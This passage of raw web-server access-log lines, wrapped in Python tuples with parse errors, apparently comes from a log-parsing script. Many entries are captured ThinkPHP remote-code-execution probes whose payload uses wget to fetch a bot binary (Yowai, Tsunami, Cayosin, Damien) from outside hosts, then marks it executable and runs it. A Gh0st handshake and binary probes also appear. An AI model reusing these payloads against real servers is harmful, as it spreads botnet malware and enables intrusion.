201159322,%201159617,%201159690,%201163552,%201163625,%201163699,%201163772,%201163844,%201163914,%201166794,%201166863,%201166932,%201167144,%201185125,%201185184,%201191707,%201220746,%201229476,%201234155,%201239181,%201254329,%201310666,%201318686,%201341078,%201342260,%201349734,%201375597,%201410809,%201422063,%201430182,%201436513,%201438437,%201439338,%201439486,%201442353,%201444125,%201459964,%201460281,%201472354,%201472672,%201476321,%201476350,%201476379,%201476409,%201476837,%201476890,%201476919,%201480940,%201487159,%201489099,%201495475,%201509219,%201512879,%201512888,%201512899,%201512913,%201512928,%201512945,%201512965,%201512987,%201513010,%201513036,%201513064,%201513092,%201513122,%201513151,%201513844,%201513876,%201520646,%201523427,%201524026,%201524054,%201524055,%201524081,%201524107,%201524108,%201524134,%201524159,%201524160,%201524186,%201524211,%201524212,%201524238,%201524240,%201530702,%201530722,%201539846,%201545910,%201564706,%201564747,%201565901,%201570359,%201570420,%201574438,%201579450,%201589701,%201594693,%201596666,%201601884,%201620686,%201656978,%201688039,%201702052,%201713362,%201732683,%201743716,%201763348,%201" 414 186 "-" "-" "-"\n', 'list index out of range')
('64.62.197.65 - - [22/Jan/2019:18:04:50 +0330] "\\x00\\x85\\x07" 400 166 "-" "-" "-"\n', 'list index out of range')
('64.62.197.65 - - [22/Jan/2019:18:04:50 +0330] "\\x05bE\\x00\\x05b\\x00\\x00@\\x00;\\x11\\x0F\\xAC\\xD8:\\xC2\\xD6" 400 166 "-" "-" "-"\n', 'list index out of range')
('124.5.72.114 - - [22/Jan/2019:18:46:45 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('42.118.70.118 - - [22/Jan/2019:19:17:55 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('149.12.217.166 - - [22/Jan/2019:19:20:15 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('74.82.60.72 - - [22/Jan/2019:19:31:13 +0330] "E\\x00\\x00I\\xCD{\\x00\\x00@\\x11\\xF5Q" 400 166 "-" "-" "-"\n', 'list index out of range')
('42.112.163.67 - - [22/Jan/2019:20:31:15 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('85.59.177.246 - - [22/Jan/2019:20:52:36 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('64.68.245.69 - - [22/Jan/2019:20:58:08 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('178.47.102.135 - - [22/Jan/2019:21:52:00 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('5.188.210.12 - - [22/Jan/2019:23:05:04 +0330] "\\x05\\x01\\x00" 400 166 "-" "-" "-"\n', 'list index out of range')
('5.188.210.12 - - [22/Jan/2019:23:06:22 +0330] "\\x04\\x01\\x00P\\x05\\xBC\\xD2\\x0C\\x00" 400 166 "-" "-" "-"\n', 'list index out of range')
('74.93.73.169 - - [23/Jan/2019:00:29:50 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86\' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"\n', 'list index out of range')
('65.127.187.7 - - [23/Jan/2019:00:36:07 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86\' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"\n', 'list index out of range')
('103.2.64.231 - - [23/Jan/2019:00:59:05 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('182.170.139.97 - - [23/Jan/2019:01:01:53 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('120.28.151.44 - - [23/Jan/2019:01:58:17 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86\' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"\n', 'list index out of range')
('66.240.205.34 - - [23/Jan/2019:03:09:34 +0330] "Gh0st\\xAD\\x00\\x00\\x00\\xE0\\x00\\x00\\x00x\\x9CKS``\\x98\\xC3\\xC0\\xC0\\xC0\\x06\\xC4\\x8C@\\xBCQ\\x96\\x81\\x81\\x09H\\x07\\xA7\\x16\\x95e&\\xA7*\\x04$&g+\\x182\\x94\\xF6\\xB000\\xAC\\xA8rc\\x00\\x01\\x11\\xA0\\x82\\x1F\\x5C`&\\x83\\xC7K7\\x86\\x19\\xE5n\\x0C9\\x95n\\x0C;\\x84\\x0F3\\xAC\\xE8sch\\xA8^\\xCF4\'J\\x97\\xA9\\x82\\xE30\\xC3\\x91h]&\\x90\\xF8\\xCE\\x97S\\xCBA4L?2=\\xE1\\xC4\\x92\\x86\\x0B@\\xF5`\\x0CT\\x1F\\xAE\\xAF]" 400 166 "-" "-" "-"\n', 'list index out of range')
('98.206.114.40 - - [23/Jan/2019:03:36:16 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86\' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"\n', 'list index out of range')
('98.206.114.40 - - [23/Jan/2019:03:36:20 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86\' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"\n', 'list index out of range')
('98.206.114.40 - - [23/Jan/2019:03:36:25 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86\' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"\n', 'list index out of range')
('66.160.199.78 - - [23/Jan/2019:03:52:09 +0330] "E\\x00\\x00J\\x11,@\\x00@\\x11\\x7F\\xA1" 400 166 "-" "-" "-"\n', 'list index out of range')
('103.213.27.147 - - [23/Jan/2019:04:18:19 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('194.113.106.124 - - [23/Jan/2019:05:21:53 +0330] "" 400 0 "-" "-" "-"\n', 'list index out of range')
('93.127.52.4 - - [23/Jan/2019:06:06:13 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('91.148.174.153 - - [23/Jan/2019:06:31:57 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('223.197.212.15 - - [23/Jan/2019:07:06:40 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86\' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"\n', 'list index out of range')
('192.99.203.185 - - [23/Jan/2019:07:23:16 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://damienondek.ga/bins/Damien.x86 -O /tmp/.Damien; chmod 777 /tmp/.Damien; /tmp/.Damien php.x86\' HTTP/1.1" 400 166 "-" "Damien/2.0" "-"\n', 'list index out of range')
('117.102.69.124 - - [23/Jan/2019:07:33:18 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86\' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"\n', 'list index out of range')
('61.121.238.84 - - [23/Jan/2019:07:33:48 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('64.68.245.69 - - [23/Jan/2019:07:43:57 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('193.86.156.188 - - [23/Jan/2019:08:05:12 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('193.86.156.188 - - [23/Jan/2019:08:05:29 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('80.211.175.115 - - [23/Jan/2019:08:20:06 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86\' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"\n', 'list index out of range')
('36.66.16.117 - - [23/Jan/2019:08:20:38 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86\' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"\n', 'list index out of range')
('120.224.101.134 - - [23/Jan/2019:09:24:38 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('196.46.202.80 - - [23/Jan/2019:09:27:16 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('5.117.116.238 - - [23/Jan/2019:09:27:27 +0330] "GET /rapidGrails/jsonList?maxColumns=10&domainClass=eshop.AuditLog&filter=[{op:and,data:[{op:%27isNotNull%27,%20field:%27actor%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27actor%27,%20val:%27system%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:or,data:[{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Product%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Product%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27persistedObjectId%27,%20val:247},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27isSynchronized%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27visitCount%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Variation%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Variation%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[655]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.ProductModel%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27ProductModel%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[1647,%2058783]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Price%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Price%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[20267,%2028028,%2032913,%2050600,%2060018,%2075651,%2097600,%20104145,%20116307,%20119634,%20120021,%20121368,%20133668,%20171205,%20184500,%20211667,%20231402,%20239281,%20243773,%20293998,%20307392,%20311228,%20324795,%20349049,%20361268,%20363747,%20381586,%20435380,%20435662,%20437128,%20437444,%20437726,%20461117,%20478700,%20568838,%20596275,%20636543,%20693203,%20695024,%20781375,%20782140,%201052862,%201056338,%201060138,%201060297,%201062813,%201063084,%201065201,%201065223,%201067894,%201070052,%201070751,%201074717,%201077799,%201081773,%201082094,%201082120,%201082146,%201083853,%201083880,%201090330,%201090849,%201091808,%201091868,%201091891,%201097260,%201098059,%201098084,%201099081,%201099455,%201101088,%201102656,%201103360,%201103796,%201103974,%201104076,%201104146,%201104179,%201104674,%201105288,%201109520,%201111611,%201118768,%201122867,%201124485,%201129387,%201132112,%201135981,%201135990,%201141252,%201141681,%201152585,%201157244,%201185071,%201186076,%201192363,%201196827,%201196838,%201198371,%201198475,%201201615,%201202495,%201205934,%201211527,%201211874,%201213091,%201216191,%201218903,%201219263,%201221659,%201226667,%201231955,%201236694,%201248311,%201255181,%201269633,%201272922,%201281074,%201281437,%201285407,%201286956,%201290806,%201293056,%201299222,%201305782,%201309655,%201324754,%201325222,%201336319,%201336640,%201339820,%201340973,%201355115,%201355411,%201358787,%201359282,%201373205,%201373845,%201374319,%201380112,%201391226,%201401012,%201401445,%201404173,%201404174,%201407035,%201407036,%201407123,%201407124,%201407210,%201407294,%201407377,%201407455,%201422790,%201423677,%201424244,%201424812,%201425380,%201425813,%201427651,%201428146,%201428566,%201429000,%201452356,%201452780,%201457257,%201457398,%201457998,%201478279,%201509674,%201512033,%201515807,%201531480,%201541488,%201550470,%201550907,%201551595,%201551672,%201551963,%201566195,%201567129,%201577808,%201591994,%201610269,%201612040,%201615378,%201615419,%201619857,%201633768,%201653187,%201658274,%201658280,%201658283,%201662737,%201679910,%201679957,%201681939,%201686637,%201701176,%201713106,%201746894,%201755738,%201762457,%201763068,%201771420,%201779494,%201785207,%201792944,%201797260,%201797268,%201797348,%201799197,%201802624,%201804453,%201806902,%201812068,%201816857,%201830995,%201835850,%201842395,%201848154,%201851428,%201851674,%201856366,%201856700,%201862895,%201862994,%201863208,%201864546,%201867539,%201870489,%201870684,%201873018,%201882018,%201883315,%201885948,%201892480,%201892542,%201893650,%201893674,%201894577,%201894979,%201896734,%201896785,%201896842,%201903467,%201904569,%201904984,%201905159,%201905830,%201906126,%201906545,%201907453,%201907703,%201907736,%201907769,%201907808,%201910720,%201912073,%201916623,%201916776,%201917055,%201920034,%201920722,%201922613,%201922770,%201922771,%201922951,%201928655,%201931006,%201933405,%201934199,%201934206,%201934252,%201935012,%201935133,%201939151,%201940659,%201940777,%201942212,%201942270,%201949122,%201949552,%201949982,%201954484,%201957983,%201958159,%201964281,%201966531,%201972728,%201052863,%201056339,%201060139,%201060298,%201062814,%201063085,%201065202,%201065224,%201067895,%201070053,%201070752,%201074718,%201077800,%201081774,%201082095,%201082121,%201082147,%201083854,%201083881,%201090331,%201090850,%201091809,%201091869,%201091892,%201097261,%201098060,%201098085,%201099082,%201099456,%201101089,%201102657,%201103361,%201103797,%201104077,%201104147,%201104180,%201104675,%201105289,%201109521,%201111612,%201118769,%201122868,%201124486,%201129388,%201132113,%201135982,%201135991,%201141253,%201141682,%201152586,%201157245,%201185072,%201186077,%201192364,%201202496,%201205935,%201211528,%201211875,%201213092,%201216192,%201218904,%201219264,%201221660,%201226668,%201231956,%201236695,%201248312,%201255182,%201269634,%201272923,%201281075,%201281438,%201285408,%201286957,%201290807,%201293057,%201299223,%201305783,%201309656,%201325223,%201336320,%201336325,%201339821,%201339832,%201355116,%201355412,%201358788,%201359283,%201373207,%201373847,%201374321,%201380114,%201391228,%201401014,%201401447,%201404175,%201404176,%201407037,%201407038,%201407125,%201407126,%201407212,%201407296,%201407379,%201407457,%201422792,%201423679,%201424246,%201424814,%201425382,%201425815,%201427653,%201428148,%201428568,%201429002,%201452358,%201452782,%201457259,%201457400,%201458000,%201478281,%201531482,%201541490,%201550472,%201550909,%201551597,%201551674,%201551967,%201566197,%201567131,%201577810,%201591996,%201610271,%201612042,%201615380,%201615421,%201619859,%201633770,%201653189,%201658276,%201658282,%201658285,%201662739,%201679912,%201679959,%201681941,%201686649,%201701178,%201713108,%201746896,%201755740,%201762459,%201763072,%201771422,%201779496,%201785213,%201792946,%201797262,%201797270,%201797350,%201799199,%201802626,%201804455,%201806904,%201812070,%201816859,%201830997,%201835852,%201842397,%201848156,%201851430,%201851676,%201856368,%201856702,%201862897,%201862996,%201863210,%201864548,%201867541,%201870491,%201870686,%201873020,%201882020,%201883317,%201885950,%201892482,%201892544,%201893652,%201893680,%201894579,%201894981,%201896736,%201896787,%201896844,%201903469,%201904571,%201904986,%201905161,%201905832,%201906128,%201906547,%201907455,%201907705,%201907738,%201907771,%201907810,%201910722,%201912075,%201916625,%201916778,%201917057,%201920" 414 186 "-" "-" "-"\n', 'list index out of range')
('151.239.241.163 - - [23/Jan/2019:09:31:08 +0330] "GET /rapidGrails/jsonList?maxColumns=10&domainClass=eshop.AuditLog&filter=[{op:and,data:[{op:%27isNotNull%27,%20field:%27actor%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27actor%27,%20val:%27system%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:or,data:[{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Product%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Product%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27persistedObjectId%27,%20val:28790},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27isSynchronized%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27visitCount%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Variation%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Variation%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[60828,%2060829,%2061106]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.ProductModel%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27ProductModel%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[57679,%2058602,%2062570]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Price%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Price%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[987106,%20987121,%20992487,%201034825,%201043822,%201043964,%201050125,%201058377,%201059103,%201065069,%201069943,%201071346,%201077679,%201080951,%201081548,%201081592,%201085226,%201090300,%201090638,%201090765,%201090829,%201096423,%201098133,%201098263,%201098306,%201098365,%201098677,%201098896,%201098936,%201101429,%201103340,%201103766,%201124747,%201129667,%201138598,%201139716,%201151604,%201157578,%201173836,%201177646,%201177724,%201177802,%201177880,%201177958,%201184023,%201184100,%201184177,%201184254,%201185435,%201186836,%201188122,%201188190,%201188289,%201188356,%201188580,%201188646,%201188714,%201188779,%201188846,%201188910,%201188974,%201189040,%201189103,%201189168,%201189230,%201189294,%201189355,%201189418,%201189478,%201189540,%201189599,%201189660,%201189718,%201189776,%201189836,%201189893,%201189952,%201190008,%201190066,%201190121,%201190178,%201190234,%201190287,%201190605,%201190657,%201190710,%201190761,%201193820,%201194310,%201194382,%201195748,%201195816,%201197112,%201197190,%201199572,%201199677,%201201148,%201205466,%201205607,%201209126,%201212283,%201216427,%201217612,%201220301,%201227114,%201227566,%201227647,%201230545,%201230625,%201230705,%201231883,%201232726,%201235726,%201239597,%201244186,%201250215,%201253250,%201255769,%201258720,%201261082,%201269482,%201271604,%201281340,%201281957,%201281965,%201284378,%201284386,%201285873,%201297334,%201297427,%201297489,%201297577,%201300614,%201301456,%201305437,%201314325,%201319335,%201325872,%201336661,%201336680,%201337864,%201338817,%201354442,%201366685,%201367179,%201395027,%201395660,%201421565,%201432684,%201451797,%201470884,%201471379,%201496577,%201529070,%201539470,%201548769,%201556973,%201557020,%201566841,%201579049,%201592648,%201593169,%201593325,%201595980,%201597681,%201601112,%201601149,%201602202,%201610910,%201628256,%201645571,%201652851,%201664619,%201675378,%201688189,%201696659,%201697024,%201707067,%201709359,%201713472,%201728294,%201728702,%201735762,%201736761,%201736937,%201738206,%201738393,%201738396,%201738399,%201738403,%201742639,%201744324,%201744364,%201750336,%201750790,%201755206,%201763498,%201780188,%201786013,%201795468,%201797424,%201800533,%201800910,%201802304,%201802469,%201809758,%201821471,%201824569,%201824643,%201824852,%201824934,%201825015,%201825157,%201825619,%201825706,%201826386,%201826489,%201826591,%201826819,%201826922,%201827124,%201828346,%201829560,%201829784,%201829942,%201831483,%201831589,%201831694,%201831800,%201831905,%201832010,%201832116,%201832283,%201832663,%201832664,%201833024,%201833131,%201833132,%201833240,%201835488,%201836063,%201836231,%201836341,%201836493,%201837002,%201837175,%201837286,%201837287,%201837398,%201837399,%201837725,%201838724,%201842685,%201844939,%201849743,%201853086,%201853413,%201856027,%201857897,%201865492,%201873202,%201884294,%201897795,%201897832,%201899561,%201901452,%201907619,%201908878,%201908938,%201908998,%201909060,%201911987,%201912031,%201912955,%201915059,%201919815,%201930846,%201931495,%201931563,%201933015,%201937676,%201942542,%201953747,%201960558,%201960739,%201965157,%201031381,%201034826,%201043823,%201043965,%201050126,%201058378,%201059104,%201065070,%201069944,%201070655,%201071347,%201077680,%201080952,%201081549,%201081593,%201085227,%201090301,%201092161,%201092284,%201098366,%201101430,%201124748,%201129668,%201138599,%201139717,%201151605,